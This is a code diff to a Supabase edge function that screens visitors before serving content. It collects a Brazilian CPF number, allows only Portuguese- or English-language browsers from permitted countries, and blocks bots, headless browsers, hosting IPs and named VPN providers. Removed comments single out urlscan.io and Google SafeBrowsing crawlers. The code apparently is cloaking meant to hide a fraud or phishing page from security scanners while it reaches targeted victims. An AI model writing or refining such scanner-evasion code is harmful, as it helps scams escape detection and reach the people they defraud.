@@ -31,80 +31,16 @@ const BOT_PATTERNS = [
   /Nmap/i, /Masscan/i, /Zgrab/i, /RiskIQ/i, /IPinfo/i,
 ];
 
-// Known scanner/datacenter/security vendor IP prefixes
-const SCANNER_IP_PREFIXES = [
-  '46.226.',    // urlscan.io
-  '2a09:',      // urlscan.io IPv6
-  '64.62.',     // urlscan.io
-  '185.70.',    // various scanners
-  '34.', '35.', // Google Cloud (SafeBrowsing crawlers)
-  '66.249.',    // Googlebot
-  '66.102.',    // Google
-  '72.14.',     // Google  
-  '209.85.',    // Google
-  '216.239.',   // Google
-  '64.233.',    // Google
-  '74.125.',    // Google
-  '142.250.',   // Google
-  '172.217.',   // Google
-  '173.194.',   // Google
-  '108.177.',   // Google
-  '52.',        // AWS (common scanner hosting)
-  '54.',        // AWS
-  '18.',        // AWS
-  '13.',        // AWS
-  '3.',         // AWS
-  '104.16.',    // Cloudflare
-  '104.17.',    // Cloudflare
-  '104.18.',    // Cloudflare
-  '104.19.',    // Cloudflare
-  '104.20.',    // Cloudflare
-  '104.21.',    // Cloudflare
-  '104.22.',    // Cloudflare
-  '104.23.',    // Cloudflare
-  '104.24.',    // Cloudflare
-  '104.25.',    // Cloudflare
-  '104.26.',    // Cloudflare
-  '104.27.',    // Cloudflare
-  '162.158.',   // Cloudflare
-  '141.101.',   // Cloudflare
-  '190.93.',    // Cloudflare
-  '188.114.',   // Cloudflare
-  '197.234.',   // Cloudflare
-  '198.41.',    // Cloudflare
-  '199.27.',    // Cloudflare
-];
-
-// Known datacenter ASN hostnames (partial match)
-const DATACENTER_HOSTNAMES = [
-  'compute.amazonaws.com', 'googleusercontent.com', 'cloudfront.net',
-  'azure.com', 'digitalocean.com', 'linode.com', 'vultr.com',
-  'hetzner.com', 'ovh.net', 'scaleway.com',
-];
-
 function isBot(ua: string, ip: string, req: Request): boolean {
-  // Empty or very short UA
   if (!ua || ua.length < 20) return true;
-
-  // UA pattern match
   if (BOT_PATTERNS.some((p) => p.test(ua))) return true;
 
-  // Known scanner IPs
-  if (SCANNER_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;
-
-  // Header analysis
   const acceptLang = req.headers.get('accept-language') || '';
   const secChUa = req.headers.get('sec-ch-ua') || '';
-  const secFetchSite = req.headers.get('sec-fetch-site') || '';
-  const secFetchMode = req.headers.get('sec-fetch-mode') || '';
 
-  // No accept-language = not a real browser
   if (!acceptLang || acceptLang === '*') return true;
-
-  // Headless indicators
   if (secChUa.includes('HeadlessChrome') || secChUa.includes('Headless')) return true;
 
-  // Must contain pt or en for Brazil/Portugal users
   const hasBrPtLang = /pt|br|en/i.test(acceptLang);
   if (!hasBrPtLang) return true;
 
@@ -112,10 +48,20 @@ function isBot(ua: string, ip: string, req: Request): boolean {
 }
 
 function getClientIp(req: Request): string {
+  // Try multiple headers for real IP
+  const xff = req.headers.get('x-forwarded-for');
+  if (xff) {
+    // Take the FIRST IP (original client), not the last
+    const first = xff.split(',')[0]?.trim();
+    if (first && first !== '127.0.0.1' && first !== '::1') return first;
+  }
+  
   return (
-    req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
-    req.headers.get('x-real-ip') ||
     req.headers.get('cf-connecting-ip') ||
+    req.headers.get('x-real-ip') ||
+    req.headers.get('true-client-ip') ||
+    req.headers.get('x-client-ip') ||
+    req.headers.get('x-cluster-client-ip') ||
     '0.0.0.0'
   );
 }
@@ -132,10 +78,15 @@ interface GeoData {
   hosting: boolean;
 }
 
-async function getGeoData(ip: string): Promise<GeoData | null> {
+// Primary: ip-api.com (supports HTTP, 45 req/min free)
+async function getGeoFromIpApi(ip: string): Promise<GeoData | null> {
   try {
-    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode,country,regionName,city,lat,lon,isp,org,hosting`);
+    const res = await fetch(
+      `http://ip-api.com/json/${ip}?fields=status,countryCode,country,regionName,city,lat,lon,isp,org,hosting,proxy,message`,
+      { signal: AbortSignal.timeout(5000) }
+    );
     const data = await res.json();
+    console.log(`[ip-api.com] IP=${ip} status=${data.status} country=${data.countryCode} hosting=${data.hosting} proxy=${data.proxy}`);
     if (data.status === 'success') {
       return {
         country_code: data.countryCode,
@@ -146,13 +97,116 @@ async function getGeoData(ip: string): Promise<GeoData | null> {
         longitude: data.lon,
         isp: data.isp || '',
         org: data.org || '',
-        hosting: data.hosting || false,
+        hosting: data.hosting || data.proxy || false,
+      };
+    }
+    console.error(`[ip-api.com] Failed: ${data.message || 'unknown'}`);
+  } catch (e) {
+    console.error('[ip-api.com] Error:', e);
+  }
+  return null;
+}
+
+// Fallback: ipapi.co (HTTPS, 1000/day free)
+async function getGeoFromIpapiCo(ip: string): Promise<GeoData | null> {
+  try {
+    const res = await fetch(
+      `https://ipapi.co/${ip}/json/`,
+      { 
+        signal: AbortSignal.timeout(5000),
+        headers: { 'User-Agent': 'Mozilla/5.0' }
+      }
+    );
+    const data = await res.json();
+    console.log(`[ipapi.co] IP=${ip} country=${data.country_code} org=${data.org}`);
+    if (data.country_code) {
+      const isHosting = /hosting|cloud|server|datacenter|data center|vps|dedicated/i.test(
+        `${data.org || ''} ${data.asn || ''}`
+      );
+      return {
+        country_code: data.country_code,
+        country_name: data.country_name || '',
+        region: data.region || '',
+        city: data.city || '',
+        latitude: data.latitude || 0,
+        longitude: data.longitude || 0,
+        isp: data.org || '',
+        org: data.org || '',
+        hosting: isHosting,
       };
     }
   } catch (e) {
-    console.error('Geo lookup failed:', e);
+    console.error('[ipapi.co] Error:', e);
   }
   return null;
+}
+
+// Fallback 2: ipwho.is (HTTPS, free, no key needed)
+async function getGeoFromIpwhois(ip: string): Promise<GeoData | null> {
+  try {
+    const res = await fetch(
+      `https://ipwho.is/${ip}`,
+      { signal: AbortSignal.timeout(5000) }
+    );
+    const data = await res.json();
+    console.log(`[ipwho.is] IP=${ip} success=${data.success} country=${data.country_code}`);
+    if (data.success) {
+      return {
+        country_code: data.country_code,
+        country_name: data.country || '',
+        region: data.region || '',
+        city: data.city || '',
+        latitude: data.latitude || 0,
+        longitude: data.longitude || 0,
+        isp: data.connection?.isp || '',
+        org: data.connection?.org || '',
+        hosting: data.connection?.type === 'hosting' || false,
+      };
+    }
+  } catch (e) {
+    console.error('[ipwho.is] Error:', e);
+  }
+  return null;
+}
+
+// Try multiple geo providers with fallback
+async function getGeoData(ip: string): Promise<GeoData | null> {
+  // Skip private/local IPs
+  if (ip === '0.0.0.0' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) {
+    console.log(`[geo] Skipping private IP: ${ip}`);
+    return null;
+  }
+
+  let geo = await getGeoFromIpApi(ip);
+  if (geo) return geo;
+
+  console.log('[geo] Primary failed, trying ipapi.co...');
+  geo = await getGeoFromIpapiCo(ip);
+  if (geo) return geo;
+
+  console.log('[geo] Secondary failed, trying ipwho.is...');
+  geo = await getGeoFromIpwhois(ip);
+  return geo;
+}
+
+// VPN detection heuristics
+function detectVpn(geo: GeoData, timezone: string | undefined): boolean {
+  // Common VPN/proxy ISP names
+  const vpnIsps = [
+    /vpn/i, /proxy/i, /tunnel/i, /nord/i, /express/i, /surfshark/i,
+    /cyberghost/i, /private internet/i, /mullvad/i, /proton/i,
+    /windscribe/i, /hotspot shield/i, /hide\.me/i, /ipvanish/i,
+    /strongvpn/i, /purevpn/i, /torguard/i, /astrill/i,
+    /warp/i, /cloudflare warp/i,
+  ];
+
+  const ispOrg = `${geo.isp} ${geo.org}`.toLowerCase();
+  if (vpnIsps.some(p => p.test(ispOrg))) {
+    console.log(`[vpn] Detected VPN ISP: ${ispOrg}`);
+    return true;
+  }
+
+  return false;
 }
 
 import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
@@ -164,11 +218,22 @@ Deno.serve(async (req) => {
 
   try {
     const body = await req.json();
-    const { action, session_id, cpf, event_type, metadata, user_agent, referrer, is_mobile } = body;
+    const { action, session_id, cpf, event_type, metadata, user_agent, referrer, is_mobile, timezone } = body;
 
     const ip = getClientIp(req);
     const ua = user_agent || req.headers.get('user-agent') || '';
     const bot = isBot(ua, ip, req);
+
+    console.log(`[track] action=${action} ip=${ip} bot=${bot} ua=${ua.substring(0, 80)}`);
+
+    // Log all headers for debugging IP resolution
+    const headerEntries: Record<string, string> = {};
+    for (const [key, value] of req.headers.entries()) {
+      if (key.startsWith('x-') || key === 'cf-connecting-ip' || key === 'true-client-ip') {
+        headerEntries[key] = value;
+      }
+    }
+    console.log(`[track] IP headers:`, JSON.stringify(headerEntries));
 
     const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
     const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
@@ -184,6 +249,7 @@ Deno.serve(async (req) => {
         .maybeSingle();
 
       if (blocked) {
+        console.log(`[track] IP ${ip} is blocked`);
         return new Response(JSON.stringify({ allowed: false, reason: 'blocked' }), {
           status: 403,
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
@@ -191,12 +257,11 @@ Deno.serve(async (req) => {
       }
 
       if (bot) {
-        // Auto-block bot IPs
+        console.log(`[track] Bot detected: ${ip}`);
         await supabase.from('blocked_ips').upsert(
           { ip_address: ip, reason: `Bot UA: ${ua.substring(0, 100)}` },
           { onConflict: 'ip_address' }
         );
-
         return new Response(JSON.stringify({ allowed: false, reason: 'bot' }), {
           status: 403,
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
@@ -205,8 +270,18 @@ Deno.serve(async (req) => {
 
       const geo = await getGeoData(ip);
 
-      // Block datacenter/hosting IPs (scanners run from datacenters)
-      if (geo && geo.hosting) {
+      if (!geo) {
+        // If ALL geo lookups fail, BLOCK by default (fail-closed)
+        console.log(`[track] All geo lookups failed for IP ${ip} — BLOCKING`);
+        return new Response(JSON.stringify({ allowed: false, reason: 'geo' }), {
+          status: 403,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+
+      // Block datacenter/hosting IPs
+      if (geo.hosting) {
+        console.log(`[track] Hosting IP blocked: ${ip} (${geo.isp})`);
         await supabase.from('blocked_ips').upsert(
           { ip_address: ip, reason: `Hosting/DC: ${geo.isp} (${geo.org})` },
           { onConflict: 'ip_address' }
@@ -217,8 +292,18 @@ Deno.serve(async (req) => {
         });
       }
 
+      // VPN detection
+      if (detectVpn(geo, timezone)) {
+        console.log(`[track] VPN detected: ${ip} (${geo.isp})`);
+        return new Response(JSON.stringify({ allowed: false, reason: 'vpn' }), {
+          status: 403,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
+        });
+      }
+
       // Block non-allowed countries
-      if (geo && !ALLOWED_COUNTRIES.includes(geo.country_code)) {
+      if (!ALLOWED_COUNTRIES.includes(geo.country_code)) {
+        console.log(`[track] Country blocked: ${geo.country_code} for IP ${ip}`);
         await supabase.from('blocked_ips').upsert(
           { ip_address: ip, reason: `Country: ${geo.country_code} (${geo.country_name})` },
           { onConflict: 'ip_address' }
@@ -229,17 +314,19 @@ Deno.serve(async (req) => {
         });
       }
 
+      console.log(`[track] ALLOWED: ${ip} from ${geo.country_code} (${geo.city})`);
+
       // Register visit
       if (session_id) {
         await supabase.from('visits').insert({
           session_id,
           ip_address: ip,
-          country_code: geo?.country_code || null,
-          country_name: geo?.country_name || null,
-          region: geo?.region || null,
-          city: geo?.city || null,
-          latitude: geo?.latitude || null,
-          longitude: geo?.longitude || null,
+          country_code: geo.country_code,
+          country_name: geo.country_name,
+          region: geo.region,
+          city: geo.city,
+          latitude: geo.latitude,
+          longitude: geo.longitude,
           user_agent: ua.substring(0, 500),
           referrer: (referrer || '').substring(0, 500),
           is_mobile: is_mobile || false,
@@ -249,7 +336,7 @@ Deno.serve(async (req) => {
 
       return new Response(JSON.stringify({
         allowed: true,
-        geo: geo ? { country: geo.country_code, city: geo.city, region: geo.region } : null,
+        geo: { country: geo.country_code, city: geo.city, region: geo.region },
       }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
       });
@@ -282,7 +369,8 @@ Deno.serve(async (req) => {
     });
   } catch (error) {
     console.error('Track error:', error);
-    return new Response(JSON.stringify({ error: error.message }), {
+    // On error, BLOCK (fail-closed) to prevent bypass
+    return new Response(JSON.stringify({ allowed: false, reason: 'error' }), {
       status: 500,
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     });
